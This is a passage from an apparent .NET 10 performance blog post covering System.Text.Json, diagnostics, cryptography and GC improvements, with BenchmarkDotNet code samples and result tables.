using BenchmarkDotNet.Running; using System.Text.Json.Nodes; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private JsonObject _obj = new(); [Benchmark] public void Set() =&gt; _obj["key"] = "value"; }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Set</td> <td>.NET 9.0</td> <td>40.56 ns</td> <td>1.00</td> </tr> <tr> <td>Set</td> <td>.NET 10.0</td> <td>16.96 ns</td> <td>0.42</td> </tr> </tbody> </table><p>Most of the improvements in <code>System.Text.Json</code>, however, are actually via new APIs. This same &ldquo;avoid a double lookup&rdquo; issue shows up in other places, for example wanting to add a property to a <code>JsonObject</code> but only if it doesn&rsquo;t yet exist. With <a href="https://github.com/dotnet/runtime/pull/111229">dotnet/runtime#111229</a> from <a href="https://github.com/Flu">@Flu</a>, that&rsquo;s addressed with a new <code>TryAdd</code> method (as well as a <code>TryAdd</code> overload and an overload of the existing <code>TryGetPropertyValue</code> that, as with <code>OrderedDictionary&lt;&gt;</code>, returns the index of the property).</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.Json.Nodes; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private JsonObject _obj = new(); private JsonNode _value = JsonValue.Create("value"); [Benchmark(Baseline = true)] public void NonOverwritingSet_Manual() { _obj.Remove("key"); if (!_obj.ContainsKey("key")) { _obj.Add("key", _value); } } [Benchmark] public void NonOverwritingSet_TryAdd() { _obj.Remove("key"); _obj.TryAdd("key", _value); } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>NonOverwritingSet_Manual</td> <td>16.59 ns</td> <td>1.00</td> </tr> <tr> <td>NonOverwritingSet_TryAdd</td> <td>14.31 ns</td> <td>0.86</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/109472">dotnet/runtime#109472</a> from <a href="https://github.com/karakasa">@karakasa</a> also imbues <code>JsonArray</code> with new <code>RemoveAll</code> and <code>RemoveRange</code> methods. In addition to the usability benefits these can provide, they have the same performance benefits they have on <code>List<t></t></code> (which is not a coincidence, given that <code>JsonArray</code> is, as an implementation detail, a wrapper for a <code>List<jsonnode></jsonnode></code>). Removing &ldquo;incorrectly&rdquo; from a <code>List<t></t></code> can end up being an <code>O(N^2)</code> endeavor, e.g. when I run this:</p><pre><code>// dotnet run -c Release -f net10.0 using System.Diagnostics; for (int i = 100_000; i &lt; 700_000; i += 100_000) { List<int> items = Enumerable.Range(0, i).ToList(); Stopwatch sw = Stopwatch.StartNew(); while (items.Count &gt; 0) { items.RemoveAt(0); // uh oh } Console.WriteLine($"{i} =&gt; {sw.Elapsed}"); }</int></code></pre><p>I get output like this:</p><pre><code>100000 =&gt; 00:00:00.2271798 200000 =&gt; 00:00:00.8328727 300000 =&gt; 00:00:01.9820088 400000 =&gt; 00:00:03.9242008 500000 =&gt; 00:00:06.9549009 600000 =&gt; 00:00:11.1104903</code></pre><p>Note how as the list length grows linearly, the elapsed time is growing non-linearly. That&rsquo;s primarily because each <code>RemoveAt(0)</code> is requiring the entire remainder of the list to shift down, which is <code>O(N)</code> in the length of the list. That means we get <code>N + (N-1) + (N-2) + ... + 1</code> operations, which is <code>N(N+1)/2</code>, which is <code>O(N^2)</code>. Both <code>RemoveRange</code> and <code>RemoveAll</code> are able to avoid those costs by doing the shifting only once per element. Of course, even without such methods, I could have written my previous removal loop in a way that keeps it linear, namely by repeatedly removing the last element rather than the first (and, of course, if I <em>really</em> intended on removing everything, I could have just used <code>Clear</code>). Typical use, however, ends up removing a smattering of elements, and being able to just delegate and not worry about accidentally incurring a non-linear overhead is helpful.</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.Json.Nodes; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private JsonArray _arr; [IterationSetup] public void Setup() =&gt; _arr = new JsonArray(Enumerable.Range(0, 100_000).Select(i =&gt; (JsonNode)i).ToArray()); [Benchmark] public void Manual() { int i = 0; while (i &lt; _arr.Count) { if (_arr[i]!.GetValue<int>() % 2 == 0) { _arr.RemoveAt(i); } else { i++; } } } [Benchmark] public void RemoveAll() =&gt; _arr.RemoveAll(static n =&gt; n!.GetValue<int>() % 2 == 0); }</int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Allocated</th> </tr> </thead> <tbody> <tr> <td>Manual</td> <td>355.230 ms</td> <td>&ndash;</td> </tr> <tr> <td>RemoveAll</td> <td>2.022 ms</td> <td>24 B</td> </tr> </tbody> </table><p>(Note that while <code>RemoveAll</code> in this micro-benchmark is more than 150x faster, it does have that small allocation that the manual implementation doesn&rsquo;t. That&rsquo;s due to a closure in the implementation while delegating to <code>List<t>.RemoveAll</t></code>. This could be avoided in the future if necessary.)</p><p>Another frequently-requested new method is from <a href="https://github.com/dotnet/runtime/pull/116363">dotnet/runtime#116363</a>, which adds new <code>Parse</code> methods to <code>JsonElement</code>. If a developer wants a <code>JsonElement</code> and only needs it temporarily, the most efficient mechanism available today is still the right answer: <code>Parse</code> a <code>JsonDocument</code>, use its <code>RootElement</code>, and then <em>only</em> when done with the <code>JsonElement</code>, dispose of the <code>JsonDocument</code>, e.g.</p><pre><code>using (JsonDocument doc = JsonDocument.Parse(json)) { DoSomething(doc.RootElement); }</code></pre><p>That, however, is really only viable when the <code>JsonElement</code> is used in a scoped manner. If a developer needs to hand out the <code>JsonElement</code>, they&rsquo;re left with three options:</p><ol> <li><code>Parse</code> into a <code>JsonDocument</code>, clone its <code>RootElement</code>, dispose of the <code>JsonDocument</code>, hand out the clone. While using <code>JsonDocument</code> is good for the temporary case, making a clone like this entails a fair bit of overhead:<pre><code>JsonElement clone; using (JsonDocument doc = JsonDocument.Parse(json)) { clone = doc.RootElement.Clone(); } return clone;</code></pre> </li> <li><code>Parse</code> into a <code>JsonDocument</code> and just hand out its <code>RootElement</code>. Please <em>do not do this</em>! <code>JsonDocument.Parse</code> creates a <code>JsonDocument</code> that&rsquo;s backed by an array from the <code>ArrayPool&lt;&gt;</code>. If you don&rsquo;t <code>Dispose</code> of the <code>JsonDocument</code> in this case, an array will be rented and then never returned to the pool. That&rsquo;s not the end of the world; if someone else requests an array from the pool and the pool doesn&rsquo;t have one cached to give them, it&rsquo;ll just manufacture one, so eventually the pool&rsquo;s arrays will be replenished. But the arrays in the pool are generally &ldquo;more valuable&rdquo; than others, because they&rsquo;ve generally been around longer, and are thus more likely to be in higher generations. By using an <code>ArrayPool</code> array rather than a new array for a shorter-lived <code>JsonDocument</code>, you&rsquo;re more likely throwing away an array that&rsquo;ll have net more impact on the overall system. The impact of that is not easily seen in a micro-benchmark.<pre><code>return JsonDocument.Parse(json).RootElement; // please don't do this</code></pre> </li> <li>Use <code>JsonSerializer</code> to deserialize a <code>JsonElement</code>. This is a simple and reasonable one-liner, but it does invoke the <code>JsonSerializer</code> machinery, which brings in more overhead.<pre><code>return JsonSerializer.Deserialize<jsonelement>(json);</jsonelement></code></pre> </li> </ol><p>Now in .NET 10, there&rsquo;s a fourth option:</p><ul> <li>Use <code>JsonElement.Parse</code>. This is the right answer. Use this instead of (1), (2), or (3).<pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Text.Json; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private const string JsonString = """{ "name": "John", "age": 30, "city": "New York" }"""; [Benchmark] public JsonElement WithClone() { using JsonDocument d = JsonDocument.Parse(JsonString); return d.RootElement.Clone(); } [Benchmark] public JsonElement WithoutClone() =&gt; JsonDocument.Parse(JsonString).RootElement; // please don't do this in production code [Benchmark] public JsonElement WithDeserialize() =&gt; JsonSerializer.Deserialize<jsonelement>(JsonString); [Benchmark] public JsonElement WithParse() =&gt; JsonElement.Parse(JsonString); }</jsonelement></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Allocated</th> </tr> </thead> <tbody> <tr> <td>WithClone</td> <td>303.7 ns</td> <td>344 B</td> </tr> <tr> <td>WithoutClone</td> <td>249.6 ns</td> <td>312 B</td> </tr> <tr> <td>WithDeserialize</td> <td>397.3 ns</td> <td>272 B</td> </tr> <tr> <td>WithParse</td> <td>261.9 ns</td> <td>272 B</td> </tr> </tbody> </table> </li> </ul><p>With JSON being used as an encoding for many modern protocols, streaming large JSON payloads has become very common. And for most use cases, it&rsquo;s already possible to stream JSON well with <code>System.Text.Json</code>. However, in previous releases there wasn&rsquo;t been a good way to stream partial string properties; string properties had to have their values written in one operation. If you&rsquo;ve got small strings, that&rsquo;s fine. If you&rsquo;ve got really, really large strings, and those strings are lazily-produced in chunks, however, you ideally want the ability to write those chunks of the property as you have them, rather than needing to buffer up the value in its entirety. <a href="https://github.com/dotnet/runtime/pull/101356">dotnet/runtime#101356</a> augmented <code>Utf8JsonWriter</code> with a <code>WriteStringValueSegment</code> method, which enables such partial writes. That addresses the majority case, however there&rsquo;s a very common case where additional encoding of the value is desirable, and an API that automatically handles that encoding helps to be both efficient and easy. These modern protocols often transmit large blobs of binary data within the JSON payloads. Typically, these blobs end up being Base64 strings as properties on some JSON object. Today, outputting such blobs requires Base64-encoding the whole input and then writing the resulting <code>byte</code>s or <code>char</code>s in their entirety into the <code>Utf8JsonWriter</code>. To address that, <a href="https://github.com/dotnet/runtime/pull/111041">dotnet/runtime#111041</a> adds a <code>WriteBase64StringSegment</code> method to <code>Utf8JsonWriter</code>. For those sufficiently motivated to reduce memory overheads, and to enable the streaming of such payloads, <code>WriteBase64StringSegment</code> enables passing in a span of bytes, which the implementation will Base64-encode and write to the JSON property; it can be called multiple times with <code>isFinalSegment=false</code>, such that the writer will continue appending the resulting Base64 data to the property, until it&rsquo;s called with a final segment that ends the property. (<code>Utf8JsonWriter</code> has long had a <code>WriteBase64String</code> method, this new <code>WriteBase64StringSegment</code> simply enables it to be written in pieces.) The primary benefit of such a method is reduced latency and working set, as the entirety of the data payload needn&rsquo;t be buffered before being written out, but we can still come up with a throughput benchmark that shows benefits:</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Buffers; using System.Text.Json; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private Utf8JsonWriter _writer = new(Stream.Null); private Stream _source = new MemoryStream(Enumerable.Range(0, 10_000_000).Select(i =&gt; (byte)i).ToArray()); [Benchmark] public async Task Buffered() { _source.Position = 0; _writer.Reset(); byte[] buffer = ArrayPool<byte>.Shared.Rent(0x1000); int totalBytes = 0; int read; while ((read = await _source.ReadAsync(buffer.AsMemory(totalBytes))) &gt; 0) { totalBytes += read; if (totalBytes == buffer.Length) { byte[] newBuffer = ArrayPool<byte>.Shared.Rent(buffer.Length * 2); Array.Copy(buffer, newBuffer, totalBytes); ArrayPool<byte>.Shared.Return(buffer); buffer = newBuffer; } } _writer.WriteStartObject(); _writer.WriteBase64String("data", buffer.AsSpan(0, totalBytes)); _writer.WriteEndObject(); await _writer.FlushAsync(); ArrayPool<byte>.Shared.Return(buffer); } [Benchmark] public async Task Streaming() { _source.Position = 0; _writer.Reset(); byte[] buffer = ArrayPool<byte>.Shared.Rent(0x1000); _writer.WriteStartObject(); _writer.WritePropertyName("data"); int read; while ((read = await _source.ReadAsync(buffer)) &gt; 0) { _writer.WriteBase64StringSegment(buffer.AsSpan(0, read), isFinalSegment: false); } _writer.WriteBase64StringSegment(default, isFinalSegment: true); _writer.WriteEndObject(); await _writer.FlushAsync(); ArrayPool<byte>.Shared.Return(buffer); } }</byte></byte></byte></byte></byte></byte></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> </tr> </thead> <tbody> <tr> <td>Buffered</td> <td>3.925 ms</td> </tr> <tr> <td>Streaming</td> <td>1.555 ms</td> </tr> </tbody> </table><p>.NET 9 saw the introduction of the <code>JsonMarshal</code> class and the <code>GetRawUtf8Value</code> method, which provides raw access to the underlying bytes of property values fronted by a <code>JsonElement</code>. For situations where the name of the property is also needed, <a href="https://github.com/dotnet/runtime/pull/107784">dotnet/runtime#107784</a> from <a href="https://github.com/mwadams">@mwadams</a> provides a corresponding <code>JsonMarshal.GetRawUtf8PropertyName</code> method.</p><h2>Diagnostics</h2><p>Over the years, I&rsquo;ve seen a fair number of codebases introduce a <code>struct</code>-based <code>ValueStopwatch</code>; I think there are even a few still floating around the <code>Microsoft.Extensions</code> libraries. The premise behind these is that <code>System.Diagnostics.Stopwatch</code> is a <code>class</code>, but it simply wraps a <code>long</code> (a timestamp), so rather than writing code like the following that allocates:</p><pre><code>Stopwatch sw = Stopwatch.StartNew(); ... // something being measured sw.Stop(); TimeSpan elapsed = sw.Elapsed;</code></pre><p>you could write:</p><pre><code>ValueStopwatch sw = ValueStopwatch.StartNew(); ... // something being measured sw.Stop(); TimeSpan elapsed = sw.Elapsed;</code></pre><p>and avoid the allocation. <code>Stopwatch</code> subsequently gained helpers that make such a <code>ValueStopwatch</code> less appealing, since as of .NET 7, I can write it instead like this:</p><pre><code>long start = Stopwatch.GetTimestamp(); ... // something being measured long end = Stopwatch.GetTimestamp(); TimeSpan elapsed = Stopwatch.GetElapsedTime(start, end);</code></pre><p>However, that&rsquo;s not quite as natural as the original example, that just uses <code>Stopwatch</code>. Wouldn&rsquo;t it be nice if you could write the original example and have it executed as if it were the latter? With all the investments in .NET 9 and .NET 10 around escape analysis and stack allocation, you now can. <a href="https://github.com/dotnet/runtime/pull/111834">dotnet/runtime#111834</a> streamlines the <code>Stopwatch</code> implementation so that <code>StartNew</code>, <code>Elapsed</code>, and <code>Stop</code> are fully inlineable. At that point, the JIT can see that the allocated <code>Stopwatch</code> instance never escapes the frame, and it can be stack allocated.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Diagnostics; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public TimeSpan WithGetTimestamp() { long start = Stopwatch.GetTimestamp(); Nop(); long end = Stopwatch.GetTimestamp(); return Stopwatch.GetElapsedTime(start, end); } [Benchmark] public TimeSpan WithStartNew() { Stopwatch sw = Stopwatch.StartNew(); Nop(); sw.Stop(); return sw.Elapsed; } [MethodImpl(MethodImplOptions.NoInlining)] private static void Nop() { } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Code Size</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>WithGetTimestamp</td> <td>.NET 9.0</td> <td>28.95 ns</td> <td>1.00</td> <td>148 B</td> <td>&ndash;</td> <td>NA</td> </tr> <tr> <td>WithGetTimestamp</td> <td>.NET 10.0</td> <td>28.32 ns</td> <td>0.98</td> <td>130 B</td> <td>&ndash;</td> <td>NA</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>WithStartNew</td> <td>.NET 9.0</td> <td>38.62 ns</td> <td>1.00</td> <td>341 B</td> <td>40 B</td> <td>1.00</td> </tr> <tr> <td>WithStartNew</td> <td>.NET 10.0</td> <td>28.21 ns</td> <td>0.73</td> <td>130 B</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/117031">dotnet/runtime#117031</a> is a nice improvement that helps reduce working set for anyone using an <code>EventSource</code> and that has events with really large IDs. For efficiency purposes, <code>EventSource</code> was using an array to map event ID to the data for that ID; lookup needs to be really fast, since the lookup is performed on every event write in order to look up the metadata for the event being written. In many <code>EventSource</code>s, the developer authors events with a small, contiguous range of IDs, and the array ends up being very dense. But if a developer authors any event with a really large ID (which we&rsquo;ve seen happen in multiple real-world projects, due to splitting events into multiple partial class definitions shared between different projects and selecting IDs for each file unlikely to conflict with each other), an array is still created with a length to accomodate that large ID, which can result in a really big allocation that persists for the lifetime of the event source, and a lot of that allocation ends up just being wasted space. Thankfully, since <code>EventSource</code> was written years ago, the performance of <code>Dictionary<tkey></tkey></code> has increased significantly, to the point where it&rsquo;s able to efficiently handle the lookups without needing the event IDs to be dense. Note that there should really only ever be one instance of a given <code>EventSource</code>-derived type; the recommended pattern is to store one into a static readonly field and just use that one. So the overheads incurred as part of this are primarily about the impact that single large allocation has on working set for the duration of the process. To make it easier to demonstrate, though, I&rsquo;m doing something you&rsquo;d never, ever do, and creating a new instance per event. Don&rsquo;t try this at home, or at least not in production.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Diagnostics; using System.Diagnostics.Tracing; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private MyListener _listener = new(); [Benchmark] public void Oops() { using OopsEventSource oops = new(); oops.Oops(); } [EventSource(Name = "MyTestEventSource")] public sealed class OopsEventSource : EventSource { [Event(12_345_678, Level = EventLevel.Error)] public void Oops() =&gt; WriteEvent(12_345_678); } private sealed class MyListener : EventListener { protected override void OnEventSourceCreated(EventSource eventSource) =&gt; EnableEvents(eventSource, EventLevel.Error); } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Oops</td> <td>.NET 9.0</td> <td>1,876.21 us</td> <td>1.00</td> <td>1157428.01 KB</td> <td>1.000</td> </tr> <tr> <td>Oops</td> <td>.NET 10.0</td> <td>22.06 us</td> <td>0.01</td> <td>19.21 KB</td> <td>0.000</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/107333">dotnet/runtime#107333</a> from <a href="https://github.com/AlgorithmsAreCool">@AlgorithmsAreCool</a> reduces thread contention involved in starting and stopping an <code>Activity</code>. <code>ActivitySource</code> maintains a thread-safe list of listeners, which only changes on the rare occasion that a listener is registered or unregistered. Any time an <code>Activity</code> is created or destroyed (which can happen at very high frequency), each listener gets notified, which requires walking through the list of listeners. The previous code used a lock to protect that listeners list, and to avoid notifying the listener while holding the lock, the implementation would take the lock, determine the next listener, release the lock, notify the listener, and rinse and repeat until it had notified all listeners. This could result in significant contention, as multiple threads started and stopped <code>Activity</code>s. Now with this PR, the list switches to be an immutable array. Each time the list changes, a new array is created with the modified set of listeners. This makes the act of changing the listeners list much more expensive, but, as noted, that&rsquo;s generally a rarity. And in exchange, notifying listeners becomes much cheaper.</p><p><a href="https://github.com/dotnet/runtime/pull/117334">dotnet/runtime#117334</a> from <a href="https://github.com/petrroll">@petrroll</a> avoids the overheads of callers needing to interact with null loggers by excluding them in <code>LoggerFactory.CreateLoggers</code>, while <a href="https://github.com/dotnet/runtime/pull/117342">dotnet/runtime#117342</a> seals the <code>NullLogger</code> type so type checks against <code>NullLogger</code> (e.g. <code>if (logger is NullLogger</code>) can be made more efficient by the JIT. And <a href="https://github.com/dotnet/roslyn-analyzers/pull/7290">dotnet/roslyn-analyzers#</a> from <a href="https://github.com/mpidash">@mpidash</a> will help developers to realize that their logging operations aren&rsquo;t as cheap as they thought they might be. Consider this code:</p><pre><code>[LoggerMessage(Level = LogLevel.Information, Message = "This happened: {Value}")] private static partial void Oops(ILogger logger, string value); public static void UnexpectedlyExpensive() { Oops(NullLogger.Instance, $"{Guid.NewGuid()} {DateTimeOffset.UtcNow}"); }</code></pre><p>It&rsquo;s using the logger source generator, which will emit an implementation dedicated to this log method, including a log level check so that it doesn&rsquo;t pay the bulk of the costs associated with logging unless the associated level is enabled:</p><pre><code>[global::System.CodeDom.Compiler.GeneratedCodeAttribute("Microsoft.Extensions.Logging.Generators", "6.0.5.2210")] private static partial void Oops(global::Microsoft.Extensions.Logging.ILogger logger, global::System.String value) { if (logger.IsEnabled(global::Microsoft.Extensions.Logging.LogLevel.Information)) { __OopsCallback(logger, value, null); } }</code></pre><p>Except, the call site is doing non-trivial work, creating a new <code>Guid</code>, fetching the current time, and allocating a string via string interpolation, even though it might be wasted work if <code>LogLevel.Information</code> isn&rsquo;t available. This CA1873 analyzer flags that: <img src="https://devblogs.microsoft.com/dotnet/wp-content/uploads/sites/10/2025/09/CA1873.png" alt="Analyzer for expensive logging sites"></p><h2>Cryptography</h2><p>A ton of effort went into cryptography in .NET 10, almost entirely focused on post&#8209;quantum cryptography (PQC). PQC refers to a class of cryptographic algorithms designed to resist attacks from quantum computers, machines that could one day render classic cryptographic algorithms like Rivest&ndash;Shamir&ndash;Adleman (RSA) or Elliptic Curve Cryptography (ECC) insecure by efficiently solving problems such as integer factorization and discrete logarithms. With the looming threat of &ldquo;harvest now, decrypt later&rdquo; attacks (where a well-funded attacker idly captures encrypted internet traffic, expecting that they&rsquo;ll be able to decrypt and read it later) and the multi-year process required to migrate critical infrastructure, the transition to quantum&#8209;safe cryptographic standards has become an urgent priority. In this light, .NET 10 adds support for ML-DSA (a National Institute of Standards and Technology PQC digital signature algorithm), Composite ML-DSA (a draft Internet Engineering Task Force specification for creating signatures that combine ML-DSA with a classical crypto algorithm like RSA), SLH-DSA (another NIST PQC signature algorithm), and ML-KEM (a NIST PQC key encapsulation algorithm). This is an important step towards quantum-resistant security, enabling developers to begin experimenting with and planning for post-quantum identity and authenticity scenarios. While this PQC effort is not about performance, the design of them is very much focused on more modern sensibilities that have performance as a key motivator. While older types, like those that derive from <code>AsymmetricAlgorithm</code>, are design around arrays, with support for spans tacked on later, the new types are design with spans at the center, and with array-based APIs available only for convenience.</p><p>There are, however, some cryptography-related changes in .NET 10 that are focused squarely on performance. One is around improving OpenSSL &ldquo;digest&rdquo; performance. .NET&rsquo;s cryptography stack is built on top of the underlying platform&rsquo;s native cryptographic libraries; on Linux, that means using OpenSSL, making it a hot path for common operations like hashing, signing, and TLS. &ldquo;Digest algorithms&rdquo; are the family of cryptographic hash functions (for example, SHA&#8209;256, SHA&#8209;512, SHA&#8209;3) that turn arbitrary input into fixed&#8209;size fingerprints; they&rsquo;re used all of the place, from verifying packages to TLS handshakes to content de-duplication. While .NET can use OpenSSL 1.x if that&rsquo;s what&rsquo;s offered by the OS, since .NET 6 it&rsquo;s been focusing more and more on optimizing for and lighting-up with OpenSSL 3 (the previously-discussed PQC support requires OpenSSL 3.5 or later). With OpenSSL 1.x, OpenSSL exposed getter functions like <code>EVP_sha256()</code>, which were cheap functions that just returned a direct pointer to the <code>EVP_MD</code> for the relevant hash implementation. OpenSSL 3.x introduced a provider model, with a fetch function (<code>EVP_MD_fetch</code>) for retrieving the provider-backed implementation. To keep source compatibility, the 1.x-era getter functions were changed to return pointers to compatibility shims: when you pass one of these legacy <code>EVP_MD</code> pointers into operations like <code>EVP_DigestInit_ex</code>, OpenSSL performs an &ldquo;implicit fetch&rdquo; under the covers to resolve the actual implementation. That implicit fetch path adds extra work, on each use. Instead, OpenSSL recommends consumers do an explicit fetch and then cache the result for reuse. That&rsquo;s what <a href="https://github.com/dotnet/runtime/pull/118613">dotnet/runtime#118613</a> does. The result is leaner and faster cryptographic hash operations on OpenSSL&#8209;based platforms.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Security.Cryptography; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private byte[] _src = new byte[1024]; private byte[] _dst = new byte[SHA256.HashSizeInBytes]; [GlobalSetup] public void Setup() =&gt; new Random(42).NextBytes(_src); [Benchmark] public void Hash() =&gt; SHA256.HashData(_src, _dst); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Hash</td> <td>.NET 9.0</td> <td>1,206.8 ns</td> <td>1.00</td> </tr> <tr> <td>Hash</td> <td>.NET 10.0</td> <td>960.6 ns</td> <td>0.80</td> </tr> </tbody> </table><p>A few other performance niceties have also found their way in.</p><ul> <li><strong><code>AsnWriter.Encode</code></strong>. <a href="https://github.com/dotnet/runtime/pull/106728">dotnet/runtime#106728</a> and <a href="https://github.com/dotnet/runtime/pull/112638">dotnet/runtime#112638</a> add and then use throughout the crypto stack a callback-based mechanism to <code>AsnWriter</code> that enables encoding without forced allocation for the temporary encoded state.</li> <li><strong><code>SafeHandle</code> singleton</strong>. <a href="https://github.com/dotnet/runtime/pull/109391">dotnet/runtime#109391</a> employs a singleton <code>SafeHandle</code> in more places in <code>X509Certificate</code> to avoid temporary handle allocation.</li> <li><strong>Span-based <code>ProtectedData</code></strong>. <a href="https://github.com/dotnet/runtime/pull/109529">dotnet/runtime#109529</a> from <a href="https://github.com/ChadNedzlek">@ChadNedzlek</a> adds <code>Span<byte></byte></code>-based overloads to the <code>ProtectedData</code> class that enable protecting data without requiring the source or destinations to be in allocated arrays.</li> <li><strong><code>PemEncoding</code> UTF-8</strong>. <a href="https://github.com/dotnet/runtime/pull/109438">dotnet/runtime#109438</a> adds UTF-8 support to <code>PemEncoding</code>. <code>PemEncoding</code>, a utility class for parsing and formatting PEM (Privacy-Enhanced Mail)-encoded data such as that used in certificates and keys, previously worked only with <code>char</code>s. As was then done in <a href="https://github.com/dotnet/runtime/pull/109564">dotnet/runtime#109564</a>, this change makes it possible to parse UTF8 data directly without first needing to transcode to UTF16.</li> <li><strong><code>FindByThumbprint</code></strong>. <a href="https://github.com/dotnet/runtime/pull/109130">dotnet/runtime#109130</a> adds an <code>X509Certification2Collection.FindByThumbprint</code> method. The implementation uses a stack-based buffer for the thumbprint value for each candidate certificate, eliminating the arrays that would otherwise be created in a naive manual implementation. <a href="https://github.com/dotnet/runtime/pull/113606">dotnet/runtime#113606</a> then utilized this in <code>SslStream</code>.</li> <li><strong><code>SetKey</code></strong> <a href="https://github.com/dotnet/runtime/pull/113146">dotnet/runtime#113146</a> adds a span-based <code>SymmetricAlgorithm.SetKey</code> method which can then be used to avoid creating unnecessary arrays.</li> </ul> <h2>Peanut Butter</h2><p>As in every .NET release, there are a large number of PRs that help with performance in some fashion. The more of these that are addressed, the more the overall overhead for applications and services is lowered. Here are a smattering from this release:</p><ul> <li><strong>GC</strong>. DATAS (Dynamic Adaptation To Application Sizes) was introduced in .NET 8 and enabled by default in .NET 9. Now in .NET 10, <a href="https://github.com/dotnet/runtime/pull/105545">dotnet/runtime#105545</a> tuned DATAS to improve its overall behavior, cutting unnecessary work, smoothing out pauses (especially under high allocation rates), correcting fragmentation accounting that could cause extra short collections (gen1), and other such tweaks. The net result is fewer unnecessary collections, steadier throughput, and more predictable latency for allocation-heavy workloads. <a href="https://github.com/dotnet/runtime/pull/118762">dotnet/runtime#118762</a> also adds several knobs for configuring how DATAS behaves, and in particular settings to fine-tune how Gen0 grows.</li> <li><strong>GCHandle</strong>. The GC supports various types of &ldquo;handles&rdquo; that allow for explicit management of resources in relation to GC operation. For example, you can create a &ldquo;pinning handle,&rdquo; which ensures that the GC will not move the object in question. Historically, these handles were surfaced to developers via the <code>GCHandle</code> type, but it has a variety of issues, including that it&rsquo;s really easy to misuse due to lack of strong typing. To help address that, <a href="https://github.com/dotnet/runtime/pull/111307">dotnet/runtime#111307</a> introduces a few new strongly-typed flavors of handles, with <code>GCHandle<t></t></code>, <code>PinnedGCHandle<t></t></code>, and <code>WeakGCHandle<t></t></code>. These should not only address some of the usability issues, they&rsquo;re also able to shave off a bit of the overheads incurred by the old design.<pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.InteropServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private byte[] _array = new byte[16]; [Benchmark(Baseline = true)] public void Old() =&gt; GCHandle.Alloc(_array, GCHandleType.Pinned).Free(); [Benchmark] public void New() =&gt; new PinnedGCHandle<byte>(_array).Dispose(); }</byte></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Old</td> <td>27.80 ns</td> <td>1.00</td> </tr> <tr> <td>New</td> <td>22.73 ns</td> <td>0.82</td> </tr> </tbody> </table> </li> <li><strong>Mono interpreter</strong>. The mono interpreter gained optimized support for several opcodes, including switches (<a href="https://github.com/dotnet/runtime/pull/107423">dotnet/runtime#107423</a>), new arrays (<a href="https://github.com/dotnet/runtime/pull/107430">dotnet/runtime#107430</a>), and memory barriers (<a 